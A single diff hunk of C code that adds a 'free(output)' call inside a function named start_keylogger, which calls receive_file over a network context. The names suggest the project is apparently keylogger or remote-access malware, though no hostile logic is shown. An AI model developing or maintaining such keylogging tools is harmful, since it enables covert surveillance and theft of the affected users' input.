@@ -245,6 +245,8 @@ int start_keylogger(struct ip_info ip_ctx)
 
     receive_file(ip_ctx);
 
+    free(output);
+
     return 0;
 }
 
